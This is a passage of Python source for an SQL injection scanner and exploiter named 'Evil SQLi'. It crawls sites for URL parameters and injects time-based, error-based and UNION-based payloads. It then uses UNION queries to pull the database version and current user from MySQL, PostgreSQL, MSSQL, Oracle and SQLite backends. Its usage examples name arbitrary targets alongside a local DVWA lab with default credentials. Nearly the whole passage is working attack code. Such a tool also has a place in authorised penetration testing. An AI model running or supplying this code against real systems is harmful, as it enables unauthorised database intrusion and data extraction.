            "Generic": "' AND SLEEP({delay})-- -"
        }
        for db_candidate, tpl in time_based_templates.items():
            for delay in [5]:
                tb_payload = tpl.format(delay=delay)
                tb_url = apply_payload_to_url(url, param, tb_payload, append=True)
                debug(f"Time test -> db={db_candidate} delay={delay} url={tb_url}")
                t0 = time.time()
                tb_resp = self.client.get(tb_url)
                elapsed = time.time() - t0
                debug(f"Time elapsed {elapsed:.2f}s baseline {baseline_avg:.2f}s")
                if tb_resp and (elapsed - baseline_avg) >= (delay - 1.0):
                    confirm_delay = delay + 2
                    confirm_payload = tpl.format(delay=confirm_delay)
                    confirm_url = apply_payload_to_url(url, param, confirm_payload, append=True)
                    t1 = time.time()
                    confirm_resp = self.client.get(confirm_url)
                    confirm_elapsed = time.time() - t1
                    debug(f"Confirm elapsed {confirm_elapsed:.2f}s")
                    if confirm_resp and (confirm_elapsed - baseline_avg) >= (confirm_delay - 1.0):
                        dbms = db_candidate
                        good(f"Confirmed Time-Based SQLi on {param} (DBMS suspected: {dbms})")
                        severity = self._calculate_severity("Time-Based", dbms)
                        confidence = self._calculate_confidence("Time-Based")
                        finding = Finding(url, param, "Time-Based", tb_payload, dbms, severity, confidence)
                        cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
                        if cols:
                            finding.columns = cols
                            good(f"Determined column count = {cols} for parameter '{param}' (ORDER BY primary)")
                            exploiter = Exploiter(self.client, url, param, dbms, cols)
                            finding.version = exploiter.get_version()
                            finding.current_user = exploiter.get_current_user()
                            if finding.version: good(f"Extracted DB Version: {finding.version}")
                            if finding.current_user: good(f"Extracted Current User: {finding.current_user}")
                        return finding

        for payload in selected_payloads:
            test_url = apply_payload_to_url(url, param, payload, append=True)
            debug(f"Error-based test payload= {payload}")
            resp = self.client.get(test_url)
            if not resp:
                continue
            eb, db_eb = self.check_error_based(baseline_html, resp.text)
            if eb:
                dbms = detect_dbms(resp.text.lower()) or db_eb or dbms
                good(f"Confirmed Error-Based SQLi on {param} | DBMS: {dbms or 'Unknown'}")
                severity = self._calculate_severity("Error-Based", dbms)
                confidence = self._calculate_confidence("Error-Based")
                finding = Finding(url, param, "Error-Based", payload, dbms, severity, confidence)
                cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
                if cols:
                    finding.columns = cols
                    good(f"Determined column count = {cols} for parameter '{param}' (ORDER BY primary)")
                    exploiter = Exploiter(self.client, url, param, dbms, cols)
                    finding.version = exploiter.get_version()
                    finding.current_user = exploiter.get_current_user()
                    if finding.version: good(f"Extracted DB Version: {finding.version}")
                    if finding.current_user: good(f"Extracted Current User: {finding.current_user}")
                return finding

        cols = self._determine_column_count(url, param, numeric_like, max_cols=20)
        if cols:
            good(f"UNION-based candidate detected (columns={cols}) for {param}")
            token = self._rand_token(8)
            vals = ["NULL"] * cols
            visible_positions = []
            for pos in range(cols):
                tv = vals.copy()
                tv[pos] = f"'{token}'"
                if numeric_like:
                    payload = f"-1 UNION SELECT {','.join(tv)}-- -"
                else:
                    payload = f"' UNION SELECT {','.join(tv)}-- -"
                test_url = apply_payload_to_url(url, param, payload, append=True)
                resp = self.client.get(test_url)
                if resp and token in resp.text:
                    visible_positions.append(pos)
            if visible_positions:
                payload = f"' UNION SELECT {','.join(['NULL']*cols)}-- -"
                severity = self._calculate_severity("Union-Based", dbms)
                confidence = self._calculate_confidence("Union-Based")
                finding = Finding(url, param, "Union-Based", payload, dbms, severity, confidence, columns=cols)
                exploiter = Exploiter(self.client, url, param, dbms, cols)
                finding.version = exploiter.get_version()
                finding.current_user = exploiter.get_current_user()
                if finding.version: good(f"Extracted DB Version: {finding.version}")
                if finding.current_user: good(f"Extracted Current User: {finding.current_user}")
                return finding
            else:
                warn("UNION-based column count found but no reflected columns detected")
        else:
            debug("UNION-based secondary check did not find columns")

        warn(f"No SQLi confirmed for parameter '{param}'")
        return None


# ===========================
# Exploiter (with debug logs)
# ===========================
class Exploiter:
    def __init__(self, client, url, param, dbms, columns=None):
        self.client = client
        self.url = url
        self.param = param
        self.dbms = dbms
        self.columns = columns or 1

    def _inject_and_extract(self, query: str) -> Optional[str]:
        marker = "XDATAX"
        debug(f"Inject & extract | dbms= {self.dbms} cols= {self.columns} query= {query}")

        if not self.columns or self.columns < 1:
            debug("No valid column count determined, aborting extraction.")
            return None

        for pos in range(self.columns):
            cols_list = ["NULL"] * self.columns
            
            if self.dbms == "MySQL":
                cols_list[pos] = f"CONCAT('{marker}', ({query}), '{marker}')"
            elif self.dbms == "PostgreSQL":
                cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
            elif self.dbms == "MSSQL":
                cols_list[pos] = f"'{marker}' + CAST(({query}) AS NVARCHAR(MAX)) + '{marker}'"
            elif self.dbms == "Oracle":
                cols_list[pos] = f"'{marker}' || ({query}) || '{marker}' FROM dual"
            else:
                cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"

            try:
                pr = urlparse(self.url)
                qs = parse_qs(pr.query, keep_blank_values=True)
                orig_val = (qs.get(self.param, [""])[0]).strip()
                numeric_like = re.fullmatch(r"-?\d+", orig_val) is not None
            except:
                numeric_like = False

            if numeric_like:
                union_payload = f"-1 UNION SELECT {', '.join(cols_list)}-- -"
            else:
                union_payload = f"' UNION SELECT {', '.join(cols_list)}-- -"

            test_url = apply_payload_to_url(self.url, self.param, union_payload, append=True)
            debug(f"Testing UNION payload: {union_payload}")
            debug(f"Full URL: {test_url}")

            resp = self.client.get(test_url)
            if resp:
                debug(f"Response len= {len(resp.text)}")
                patterns = [
                    re.escape(marker) + r'(.*?)' + re.escape(marker),
                    r'' + re.escape(marker) + r'(.*?)' + re.escape(marker) + r'',
                    marker + r'(.*?)' + marker
                ]
                
                for pattern in patterns:
                    matches = re.findall(pattern, resp.text, re.DOTALL | re.IGNORECASE)
                    debug(f"Regex pattern: {pattern}")
                    debug(f"Matches found: {matches}")

                    if matches:
                        extracted = matches[0].strip()
                        extracted = re.sub(r'^[\'",\s]+|[\'",\s]+$', '', extracted)
                        debug(f"Cleaned extracted value: {extracted}")
                        return extracted

        debug("No matches found for injected query.")
        return None

    def get_version(self):
        version_queries = {
            "MySQL": "@@version",
            "PostgreSQL": "version()",
            "MSSQL": "@@version",
            "Oracle": "(SELECT banner FROM v$version WHERE rownum=1)",
            "SQLite": "sqlite_version()"
        }
        query = version_queries.get(self.dbms)
        debug(f"get_version query= {query}")
        if not query:
            return None
        return self._inject_and_extract(query)

    def get_current_user(self):
        user_queries = {
            "MySQL": "user()",
            "PostgreSQL": "current_user",
            "MSSQL": "SYSTEM_USER",
            "Oracle": "(SELECT user FROM dual)",
            "SQLite": "CURRENT_USER"
        }
        query = user_queries.get(self.dbms)
        debug(f"get_current_user query= {query}")
        if not query:
            return None
        return self._inject_and_extract(query)

# ===========================
# Orchestrator
# ===========================
class App:
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.client = HttpClient(timeout=self.config.timeout, delay=self.config.delay, use_cookies=self.config.use_cookies)
        self.scanner = Scanner(self.client)

    def _setup_logging(self, verbose: bool) -> None:
        level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(os.path.join(SCRIPT_DIR, 'sqli_scanner.log')),
                logging.StreamHandler()
            ]
        )

    def run(self, args_list=None) -> None:
        import argparse
        parser = argparse.ArgumentParser(
            description=(
                "Evil SQLi\n"
                "SQL Injection Scanner\n"
                "--------------------------------------------------\n"
                "Supports crawling websites to discover parameters\n"
                "and scanning for multiple SQLi techniques:\n"
                "  - Error-Based\n"
                "  - Boolean-Based\n"
                "  - Time-Based\n"
                "  - Union-Based\n"
                "--------------------------------------------------"
            ),
            formatter_class=argparse.RawTextHelpFormatter,
            epilog=(
                "Examples:\n"
                "  python Evil_SQLi.py -u https://example.com --mode crawl --depth 3\n"
                "  python Evil_SQLi.py -u https://target.com/page.php?id=1 --mode scan\n"
                "  python Evil_SQLi.py -u https://site.com --depth 4 --timeout 15 --delay 1.0\n"
                "  python Evil_SQLi.py -u https://demo.com --mode scan --no-cookies --verbose\n"
                "  python Evil_SQLi.py -u https://test.com --mode scan --output results_folder\n"
                "  python Evil_SQLi.py -u http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit --dvwa-login\n"
            )
        )
        parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
        parser.add_argument('--mode', choices=['crawl', 'scan'], default='scan',
                            help=("Operation mode:\n"
                                "  crawl -> discover URLs and parameters only\n"
                                "  scan  -> discover and actively test for SQL injection vulnerabilities"))
        parser.add_argument('--depth', type=int, default=2, help='Crawl depth (default: 2)')
        parser.add_argument('--delay', type=float, default=0.5, help='Delay between HTTP requests in seconds (default: 0.5)')
        parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
        parser.add_argument('--no-cookies', action='store_true', help='Disable cookies and do not maintain session state')
        parser.add_argument('--verbose', action='store_true', help='Enable verbose logging (prints debug info)')
        parser.add_argument('--output', type=str, default=None, help='Custom output directory (default: domain-based folder in script directory)')
        parser.add_argument('--debug', action='store_true', help='Enable extra debug prints to console')
        parser.add_argument('--dvwa-login', action='store_true', help='Auto login to DVWA before scanning (username=admin, password=password, security=low)')

        args = parser.parse_args(args_list)

        global DEBUG
        DEBUG = bool(args.debug)

        self._setup_logging(args.verbose)

        self.client = HttpClient(timeout=args.timeout, delay=args.delay, use_cookies=not args.no_cookies)
        self.scanner = Scanner(self.client)
        debug(f"Client config | timeout= {args.timeout}s delay= {args.delay}s use_cookies= {not args.no_cookies}")  
        if args.dvwa_login or "dvwa" in args.url.lower():
            from urllib.parse import urlparse
            base_url = f"{urlparse(args.url).scheme}://{urlparse(args.url).netloc}/dvwa"
            if self.client.login_dvwa(base_url, username="admin", password="password", security="low"):
                info("DVWA authentication successful")
            else:
                warn("DVWA authentication failed, continuing unauthenticated")

        folder = domain_folder(args.url)
        if args.output:
            folder = os.path.join(SCRIPT_DIR, args.output)
            os.makedirs(folder, exist_ok=True)

        if args.mode == 'crawl':
            info(f"Starting crawl on {args.url} with depth {args.depth}")
            self.do_crawl(args.url, args.depth, folder=folder)
        elif args.mode == 'scan':
            info(f"Starting scan on {args.url} with depth {args.depth}")
            self.do_scan(args.url, args.depth, folder=folder)

    def do_crawl(self, target: str, depth: int, folder: str) -> None:
        crawler = Crawler(target, depth=depth, client=self.client)
        results = crawler.run()
        lines = [f"{r.url} -> {r.params}" for r in results]
        save_text(folder, "crawl_result.txt", lines)

    def do_scan(self, target: str, depth: int, folder: str) -> None:
        parsed = urlparse(target)
        if parsed.query and parse_qs(parsed.query):
            params = list(parse_qs(parsed.query).keys())
            endpoints = [CrawlResult(target, params)]
            info(f"Scanning provided URL directly with parameters: {params}")
        else:
            crawler = Crawler(target, depth=depth, client=self.client)
            endpoints = crawler.run()
            if not endpoints:
                warn("No endpoints with query parameters discovered during crawl.")

        info("Using built-in payloads and error patterns")

        for ep in endpoints:
            if not ep.params:
                continue
            info(f"Testing URL: {ep.url}")
            for p in ep.params:
                finding = self.scanner.scan_param(ep.url, p, folder)
                if finding:
                    self.scanner.findings.append(finding)

        lines = [
            (f"{f.technique} | url= {f.url} | param= {f.param} | payload= {f.payload} | dbms= {f.dbms or ''} "
             f"| severity= {f.severity} | confidence= {f.confidence} | columns= {f.columns if f.columns else ''}"
             f"| version= {f.version if f.version else ''} | user= {f.current_user if f.current_user else ''}")
            for f in self.scanner.findings
        ]

        if lines:
            save_text(folder, "scan_result.txt", lines)
            save_json(
                folder,
                "scan_result.json",
                {"target": target, "findings": [f.to_dict() for f in self.scanner.findings]},
            )
        else:
            warn("No confirmed SQLi findings. Nothing to save.")


# ===========================
# Entry
# ===========================
if __name__ == "__main__":
    Symbol()
    try:
        App().run(sys.argv[1:])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")

